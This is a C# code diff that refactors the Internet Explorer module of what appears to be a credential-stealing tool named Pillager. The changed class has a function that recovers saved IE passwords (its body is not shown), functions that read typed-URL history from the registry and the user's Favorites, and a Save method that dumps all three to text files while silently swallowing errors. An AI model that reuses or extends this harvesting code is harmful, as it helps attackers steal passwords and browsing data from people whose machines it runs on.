@@ -10,22 +10,14 @@ using System.Text.RegularExpressions;
 
 namespace Pillager.Browsers
 {
-    public static class IE
+    public class IE : ICommand
     {
-        public static string BrowserName = "IE";
 
-        [DllImport("kernel32", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
-
-        [DllImport("kernel32")]
-        public static extern IntPtr GetCurrentProcess();
-
-        public static string IE_passwords()
+        public string IE_passwords()
         {
             if (IntPtr.Size == 4)
             {
-                IsWow64Process(GetCurrentProcess(), out var is64Bit);
+                Native.IsWow64Process(Native.GetCurrentProcess(), out var is64Bit);
                 if (is64Bit)
                 {
                     return "Don't support recovery IE password from wow64 process";
@@ -224,7 +216,7 @@ namespace Pillager.Browsers
             return sb.ToString();
         }
 
-        public static string IE_history() 
+        public string IE_history() 
         {
             StringBuilder sb = new StringBuilder();
             RegistryKey myreg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\TypedURLs");
@@ -248,7 +240,7 @@ namespace Pillager.Browsers
             return sb.ToString();
         }
 
-        public static string IE_books()
+        public string IE_books()
         {
             StringBuilder sb = new StringBuilder();
             string book_path = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);
@@ -269,18 +261,18 @@ namespace Pillager.Browsers
             return sb.ToString();
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
-                string savepath = Path.Combine(path, BrowserName);
+                string savepath = Path.Combine(path, "IE");
                 Directory.CreateDirectory(savepath);
                 string passwords = IE_passwords();
                 string books = IE_books();
                 string history = IE_history();
-                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
-                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
-                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, "IE_passwords.txt"), passwords, Encoding.UTF8);
+                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, "IE_books.txt"), books, Encoding.UTF8);
+                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, "IE_history.txt"), history, Encoding.UTF8);
             }
             catch { }
         }
